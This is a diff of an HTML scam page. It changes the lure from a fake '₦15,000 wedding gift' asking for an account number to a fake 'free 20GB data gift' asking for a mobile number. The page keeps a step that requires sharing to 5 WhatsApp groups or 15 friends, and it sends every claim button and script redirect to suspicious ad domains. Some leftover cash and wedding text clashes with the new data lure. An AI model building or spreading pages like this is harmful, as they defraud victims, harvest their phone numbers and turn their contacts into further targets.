@@ -37,12 +37,12 @@
    
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ENTER YOUR ACCOUNT NUMBER</title>
+    <title>ENTER YOUR MOBILE NUMBER</title>
     <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
     
-    <meta name="og:title" content="ENTER YOUR ACCOUNT NUMBER" />
+    <meta name="og:title" content="ENTER YOUR MOBILE NUMBER" />
     <meta property="og:description"
-        content="₦15,000 PELLER AND JARVIS WEDDING GIFT" />
+        content="PELLER APPRECIATION FREE 20GB DATA GIFT" />
     <meta property="og:image"
         content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJqCdkoiV_VKPosIR4jf9ff2Lb0k1vbjPhker9YfqAnx_wdyYKOY2QXa6OhCAIvHtwQ4dhm5tKxiCLFw6zUEVVk0VONmSAqNpwe33i_ete-Hzqw84b_YCiK_WS3Cmu1R2M7D2I5hU5CnlzZf3XuApdWtAF5L6WEZBnGC0Ln9xqCPhmVbtmI-Gq2B8U4xpd/s320/E36B00EE-5F53-46C3-A782-C0C0237F5E93.png" />
     <meta property="og:type" content="website" />
@@ -443,7 +443,7 @@ background-color: rgb(52, 4, 64);
  
             
 
-            <button id="go">GET ₦15,000</button>
+            <button id="go">GET FREE GIFT DATA</button>
         </div>
         <div id="loader">
             <div>Please Wait ...</div>
@@ -451,7 +451,7 @@ background-color: rgb(52, 4, 64);
             <div id="num">0%</div>
         </div>
         <div id="info">
-            <p class="title"> ENTER YOUR ACCOUNT NUMBER:</p>
+            <p class="title"> ENTER YOUR MOBILE NUMBER:</p>
             <div class="phone">
                 <center><input type="char" placeholder="XXXXXXXXXX" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);">
                 </center>
@@ -526,7 +526,7 @@ background-color: rgb(52, 4, 64);
 
                 <button id="confirm">Submit</button>
             </div>
-            <p class="error">Please Validate Your Account Number</p>
+            <p class="error">Please Validate Your Mobile Number</p>
         </div>
         <div id="checking">
             <p class="title">Please wait a moment...</p>
@@ -545,12 +545,12 @@ background-color: rgb(52, 4, 64);
 
             <p class="tip"> Congratulations, <span id="getname"></span>،</p>
             <p class="tip">
-                Your ₦15,000 Gift is <font color="red"><b>pending</b></font> because you have not completed the WITHDRAWAL process
-               <span class="amount"> Complete the process to receive your cash now </span><br>
+                Your 20Gb Gift Data is <font color="red"><b>pending</b></font> because you have not completed the DATA process
+               <span class="amount"> Complete the process to receive your data now </span><br>
               <font color="red"><b>How to proceed?</b></font>
             </p><br>
             <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
-            <p class="tip">2. You will be redirected automatically to "WITHDRAWAL" page after the GREEN verification bar is filled.</p>
+            <p class="tip">2. You will be redirected automatically to "DATA" page after the GREEN verification bar is filled.</p>
 
 
             <button id="whatsapp">SHARE</button>
@@ -566,22 +566,22 @@ background-color: rgb(52, 4, 64);
         </div>
         <div id="claim">
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
-            <p class="title"> Click "WITHDRAW" to get withdrawal code in 24/48 hours </p>
+            <p class="title"> Click "GIFT DATA" to get gift code in 24/48 hours </p>
             <br/>
-            <a onclick="window.open('https://ey43.com/4/3144603')"
-                href="https://obqj2.com/4/6798333">
+            <a onclick="window.open('https://omg10.com/4/11196136')"
+                href="https://omg10.com/4/11196136">
                 <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">WITHDRAW CASH</font></button>
             </a><br/>
 
 
-                <a onclick="window.open('https://ey43.com/4/3144603')"
-                    href="https://obqj2.com/4/6798333">
+                <a onclick="window.open('https://omg10.com/4/11196136')"
+                    href="https://omg10.com/4/11196136">
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">GET WITHDRAWAL CODE </font></button>
                 </a><br/>
 
 
-            <a onclick="window.open('https://ey43.com/4/3144603')"
-                    href="https://obqj2.com/4/6798333">
+            <a onclick="window.open('https://omg10.com/4/11196136')"
+                    href="https://omg10.com/4/11196136">
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">WITHDRAWAL ₦15,000 </font></button>
                 </a><br/>
 
@@ -602,8 +602,8 @@ background-color: rgb(52, 4, 64);
             <i> <big><b>Wedding Livestream will be showing here on August 1st</b></big></i>
           </center>   
    <br/>
-    <a onclick="window.open('https://ey43.com/4/3144603')"
-                    href="https://obqj2.com/4/6798333">
+    <a onclick="window.open('https://omg10.com/4/11196136')"
+                    href="https://omg10.com/4/11196136">
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">JOIN LIVE </font></button>
                 </a><br/>
 
@@ -731,7 +731,7 @@ background-color: rgb(52, 4, 64);
     text2 = " an amount of ",
     text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
     error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-    abcde = "https://ey43.com/4/3144603",
+    abcde = "https://omg10.com/4/11196136",
     saved = "",
     share = "whatsapp://send?text="+text1;
 </script>
@@ -743,10 +743,10 @@ background-color: rgb(52, 4, 64);
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://ey43.com/4/3144603";
+        location.href="https://omg10.com/4/11196136";
     }
     function goon(){
-        location.href="https://ey43.com/4/3144603";
+        location.href="https://omg10.com/4/11196136";
     }
 </script>
 
